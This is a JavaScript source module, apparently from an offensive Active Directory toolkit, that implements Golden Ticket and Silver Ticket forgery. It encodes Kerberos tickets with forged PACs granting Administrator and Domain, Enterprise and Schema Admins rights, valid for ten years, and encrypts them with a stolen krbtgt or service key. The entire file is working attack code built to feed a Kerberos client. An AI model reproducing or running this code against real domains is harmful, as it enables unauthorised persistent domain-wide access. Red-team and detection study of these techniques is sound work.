import { concat, tlv, octetString, sequence } from '../ldap/ber.js';
import {
  ctx, app, asnInt, generalString, kerberosTime, bitString32,
  principalName, encryptedData, encryptionKey,
} from './asn1.js';
import { NAME_TYPE, ETYPE } from './constants.js';
import { encrypt, randomBytes } from './crypto.js';
import { buildPac } from './pac.js';

// TicketFlags (RFC 4120, MSB-first bit numbering)
const TF_FORWARDABLE  = 0x40000000;
const TF_PROXIABLE    = 0x10000000;
const TF_RENEWABLE    = 0x00800000;
const TF_INITIAL      = 0x00400000;
const TF_PRE_AUTHENT  = 0x00200000;

const GOLDEN_FLAGS = TF_FORWARDABLE | TF_PROXIABLE | TF_RENEWABLE | TF_INITIAL | TF_PRE_AUTHENT;

// key usage 2 = AS-REP Ticket / TGS-REP Ticket enc-part (service key)
const KU_TICKET = 2;

function tenYears() {
  const d = new Date();
  d.setUTCFullYear(d.getUTCFullYear() + 10);
  return d;
}

// AuthorizationData wrapping a PAC
function authzDataPac(pacBytes) {
  const pacEntry = sequence(ctx(0, asnInt(128)), ctx(1, octetString(pacBytes)));
  const ifRelevant = sequence(pacEntry);
  return sequence(sequence(ctx(0, asnInt(1)), ctx(1, octetString(ifRelevant))));
}

// EncTicketPart ::= [APPLICATION 3]
function encTicketPart({ flags, sessionKey, crealm, cname, authtime, starttime, endtime, renewtill, authzData }) {
  const parts = [
    ctx(0, bitString32(flags)),
    ctx(1, encryptionKey(sessionKey.etype, sessionKey.key)),
    ctx(2, generalString(crealm)),
    ctx(3, principalName(NAME_TYPE.PRINCIPAL, cname)),
    ctx(4, sequence(ctx(0, asnInt(0)), ctx(1, octetString(new Uint8Array(0))))), // transited
    ctx(5, kerberosTime(authtime)),
    ctx(6, kerberosTime(starttime)),
    ctx(7, kerberosTime(endtime)),
    ctx(8, kerberosTime(renewtill)),
  ];
  if (authzData) parts.push(ctx(10, authzData));
  return app(3, sequence(...parts));
}

// Ticket ::= [APPLICATION 1]
function ticketAsn1(realm, sname, snameType, etype, cipher, kvno) {
  return app(1, sequence(
    ctx(0, asnInt(5)),
    ctx(1, generalString(realm)),
    ctx(2, principalName(snameType, sname)),
    ctx(3, encryptedData(etype, cipher, kvno)),
  ));
}

function keySize(etype) {
  if (etype === ETYPE.RC4_HMAC) return 16;
  if (etype === ETYPE.AES128_CTS_HMAC_SHA1_96) return 16;
  if (etype === ETYPE.AES256_CTS_HMAC_SHA1_96) return 32;
  return 16;
}

// Forge a Golden Ticket (TGT). Returns an object compatible with KerberosClient's
// TGT format so it can be passed to getTGS() for service ticket acquisition.
export function forgeGoldenTicket({
  username = 'Administrator',
  userId = 500,
  domain,
  domainSid,
  krbtgtKey,
  etype = ETYPE.RC4_HMAC,
  groups = [513, 512, 520, 518, 519],
  primaryGroupId = 513,
  duration = null,
}) {
  const realm = domain.toUpperCase();
  const now = new Date();
  const endtime = duration || tenYears();
  const sessionKeyBytes = randomBytes(keySize(etype));

  const pac = buildPac({
    username, domain, domainSid,
    userId, primaryGroupId, groupIds: groups,
    key: krbtgtKey, etype, logonTime: now,
  });

  const sessionKey = { etype, key: sessionKeyBytes };
  const plaintext = encTicketPart({
    flags: GOLDEN_FLAGS,
    sessionKey,
    crealm: realm,
    cname: [username],
    authtime: now,
    starttime: now,
    endtime,
    renewtill: endtime,
    authzData: authzDataPac(pac),
  });

  const cipher = encrypt(etype, krbtgtKey, KU_TICKET, plaintext);
  const ticket = ticketAsn1(realm, ['krbtgt', realm], NAME_TYPE.SRV_INST, etype, cipher, 2);

  return {
    ticket,
    sessionKey,
    crealm: realm,
    cname: [username],
    username,
    realm,
    clockOffsetMs: 0,
  };
}

// Forge a Silver Ticket (service ticket). Returns an object compatible with
// KerberosClient's TGS result so it can be used directly for AP-REQ auth.
export function forgeSilverTicket({
  username = 'Administrator',
  userId = 500,
  domain,
  domainSid,
  serviceKey,
  etype = ETYPE.RC4_HMAC,
  spn,
  groups = [513, 512, 520, 518, 519],
  primaryGroupId = 513,
  duration = null,
}) {
  const realm = domain.toUpperCase();
  const now = new Date();
  const endtime = duration || tenYears();
  const sessionKeyBytes = randomBytes(keySize(etype));
  const sname = spn.split('/');

  const pac = buildPac({
    username, domain, domainSid,
    userId, primaryGroupId, groupIds: groups,
    key: serviceKey, etype, logonTime: now,
  });

  const sessionKey = { etype, key: sessionKeyBytes };
  const plaintext = encTicketPart({
    flags: GOLDEN_FLAGS & ~TF_INITIAL,
    sessionKey,
    crealm: realm,
    cname: [username],
    authtime: now,
    starttime: now,
    endtime,
    renewtill: endtime,
    authzData: authzDataPac(pac),
  });

  const cipher = encrypt(etype, serviceKey, KU_TICKET, plaintext);
  const ticket = ticketAsn1(realm, sname, NAME_TYPE.SRV_INST, etype, cipher, 2);

  return {
    ticket,
    sessionKey,
    crealm: realm,
    cname: [username],
    realm,
    spn,
    clockOffsetMs: 0,
  };
}
